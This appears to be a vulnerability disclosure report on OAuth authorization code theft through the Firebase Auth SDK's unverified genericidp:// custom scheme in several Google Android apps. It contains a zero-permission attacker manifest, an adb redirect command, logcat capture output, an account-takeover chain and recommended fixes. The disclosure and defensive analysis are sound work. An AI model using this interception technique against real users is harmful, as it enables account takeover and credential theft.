# Firebase Auth SDK — OAuth Authorization Code Theft via Unverified `genericidp://` Custom Scheme Across Multiple Google Apps

## Summary

The Firebase Auth SDK registers a BROWSABLE intent filter for the custom URI scheme `genericidp://firebase.auth/` in every Android app that includes the Firebase Auth library for federated identity provider sign-in. Because `genericidp://` is a custom scheme (not `https://`), it cannot use Android App Link verification (`autoVerify=true`). A zero-permission attacker app can register a competing intent filter for the same scheme, causing Android to display a disambiguation chooser. If the user selects the attacker app, the OAuth authorization code from the federated identity provider is exfiltrated — enabling account takeover.

**Five Google apps on a stock Pixel 6a (Android 17 Beta) are affected simultaneously:**
1. Google Recorder (`com.google.android.apps.recorder`)
2. Android Beta Feedback / BetterBug (`com.google.android.apps.betterbug`)
3. Device Usage Study (`com.google.android.apps.deviceusagestudy`)
4. Live Transcribe & Sound Notifications (`com.google.audio.hearing.visualization.accessibility.scribe`)
5. Google Play Services (`com.google.android.gms`)

## Severity: CRITICAL

- **Attack vector**: Local (malicious app installed on device)
- **Permissions required**: ZERO
- **User interaction**: User must select attacker app from disambiguation chooser during federated sign-in
- **CIA impact**:
  - Confidentiality: OAuth authorization code stolen, enabling session hijacking
  - Integrity: Attacker can authenticate as the victim to the Firebase-backed service
  - Availability: Legitimate app never receives the OAuth callback, breaking the sign-in flow

## Root Cause

The Firebase Auth SDK's `GenericIdpActivity` registers a BROWSABLE intent filter for:
```
scheme: genericidp
authority: firebase.auth
path: /
```

This is a custom URI scheme used as the OAuth redirect endpoint for federated identity providers (Microsoft, GitHub, Apple, OIDC). When the user authenticates with the IdP in a Chrome Custom Tab, the IdP redirects to `genericidp://firebase.auth/?link=<encoded_auth_handler_url>`, where the `link` parameter contains the OAuth authorization code.

Because:
1. `genericidp://` is a custom scheme — Android App Link verification is impossible
2. The scheme+authority is identical across ALL apps using Firebase Auth
3. Any app can register a competing BROWSABLE filter for the same scheme

Android cannot determine which app should receive the redirect and presents a chooser dialog. An attacker app appearing in this chooser steals the OAuth authorization code.

## Affected Components

| Package | App Name | GenericIdpActivity |
|---------|----------|-------------------|
| `com.google.android.apps.recorder` | Google Recorder | `com.google.firebase.auth.internal.GenericIdpActivity` |
| `com.google.android.apps.betterbug` | Android Beta Feedback | `com.google.firebase.auth.internal.GenericIdpActivity` |
| `com.google.android.apps.deviceusagestudy` | Device Usage Study | `com.google.firebase.auth.internal.GenericIdpActivity` |
| `com.google.audio.hearing.visualization.accessibility.scribe` | Live Transcribe | `com.google.firebase.auth.internal.GenericIdpActivity` |
| `com.google.android.gms` | Google Play Services | `com.google.firebase.auth.internal.GenericIdpActivity` |

All apps also register `recaptcha://firebase.auth/` via `RecaptchaActivity` with the same vulnerability pattern.

- **Tested on**: Pixel 6a, Android 17 Beta (API 37), September 2026

## Proof of Concept

### Attacker App (com.vrp.zeroperm)

Zero-permission app with competing intent filter:

```xml
<activity android:name=".OAuthInterceptActivity" android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.VIEW" />
        <category android:name="android.intent.category.DEFAULT" />
        <category android:name="android.intent.category.BROWSABLE" />
        <data android:scheme="genericidp"
              android:host="firebase.auth"
              android:path="/" />
    </intent-filter>
</activity>
```

### Reproduction Steps

1. Install the PoC APK (`poc.apk`) — holds **zero** Android permissions
2. Trigger a Firebase Auth federated sign-in flow on any affected app (e.g., sign in with Microsoft on Google Recorder)
3. Alternatively, simulate the OAuth redirect:
   ```
   adb shell am start -a android.intent.action.VIEW -c android.intent.category.BROWSABLE \
     -d 'genericidp://firebase.auth/?link=https%3A%2F%2Fexample.firebaseapp.com%2F__%2Fauth%2Fhandler%3Fcode%3D4%2F0AQSTgQHsJ_OAUTH_AUTH_CODE%26state%3DAMbdmDlj0wR'
   ```
4. Android displays "Open with" chooser showing ZeroPerm alongside Recorder, BetterBug, Device Usage Study, and Scribe
5. If user selects ZeroPerm, the full OAuth redirect including authorization code is captured

### Runtime Proof (logcat)

```
W OAUTH_INTERCEPT: === OAuth Scheme Interception PoC ===
W OAUTH_INTERCEPT: UID=10394 (ZERO permissions)
W OAUTH_INTERCEPT: [+] Data URI: genericidp://firebase.auth/?link=https%3A%2F%2Fexample.firebaseapp.com%2F__%2Fauth%2Fhandler%3Fcode%3D4%2F0AQSTgQHsJ_OAUTH_AUTH_CODE_STOLEN%26state%3DAMbdmDlj0wR_SESSION_STATE
W OAUTH_INTERCEPT: [+] Param: link = https://example.firebaseapp.com/__/auth/handler?code=4/0AQSTgQHsJ_OAUTH_AUTH_CODE_STOLEN&state=AMbdmDlj0wR_SESSION_STATE
W OAUTH_INTERCEPT: === Zero-permission app intercepted OAuth callback ===
```

### Chooser Evidence

The chooser dialog appears with 5+ apps competing for the same `genericidp://firebase.auth/` scheme:
- **ZeroPerm** (attacker — zero permissions)
- Recorder (Google)
- Android Beta Feedback (Google)
- Device Usage Study (Google)
- Live Transcribe & Sound Notifications (Google)

See attached screenshots: `screen_chooser_zeroperm.png` (ZeroPerm at top of chooser), `screen_chooser_google_only.png` (chooser without attacker showing 4 Google apps already in conflict), `screen_data_capture.png` (captured OAuth data displayed by attacker).

## Stolen Data

| Parameter | Description | Impact |
|-----------|-------------|--------|
| `link` | Full OAuth handler URL containing authorization code | **Account takeover** — code can be exchanged for access/refresh tokens |
| `code` (inside link) | OAuth authorization code from identity provider | Direct credential theft |
| `state` (inside link) | CSRF protection state parameter | Enables session fixation attacks |

## Attack Chain: Account Takeover

1. Attacker installs zero-permission app with `genericidp://firebase.auth/` filter
2. Victim initiates federated sign-in (e.g., "Sign in with Microsoft") on any affected Google app
3. Chrome Custom Tab opens IdP login page → user authenticates
4. IdP redirects to `genericidp://firebase.auth/?link=<handler_with_auth_code>`
5. Android shows chooser → user selects attacker app (or attacker is set as default)
6. **Attacker captures OAuth authorization code**
7. Attacker exchanges code for access token at the Firebase Auth handler endpoint
8. Attacker has full authenticated session as the victim

## Additional Finding: `recaptcha://firebase.auth/`

All five affected apps also register `recaptcha://firebase.auth/` via `RecaptchaActivity` with identical BROWSABLE filters. This scheme carries reCAPTCHA verification tokens during phone number authentication flows.

## Additional Finding: `betterbug://crossdevicefeedback`

BetterBug additionally registers a BROWSABLE custom scheme `betterbug://crossdevicefeedback/weardeviceapp` for cross-device bug feedback from Wear OS. This is also interceptable by a zero-permission attacker.

## Recommended Fix

1. **Migrate Firebase Auth SDK to use Android App Links** (`https://` with `autoVerify=true`) for OAuth redirects instead of custom schemes
2. **Use PKCE (Proof Key for Code Exchange)** to bind the authorization code to the originating app, making stolen codes useless
3. **Implement per-app unique redirect schemes** using the app's package name or signing certificate hash (e.g., `com.google.android.apps.recorder.firebase.auth://`)
4. **Remove BROWSABLE category** from the GenericIdpActivity intent filter if cross-app invocation is not needed
5. **Validate the calling package** via `Activity.getReferrer()` before processing the OAuth redirect

## Files Attached

- `poc.apk` — Zero-permission PoC app (v1.50)
- `screen_chooser_zeroperm.png` — Chooser showing ZeroPerm at top alongside 4 Google apps
- `screen_chooser_google_only.png` — Chooser showing 4 Google apps already in conflict (before attacker installed)
- `screen_data_capture.png` — ZeroPerm displaying captured OAuth authorization code
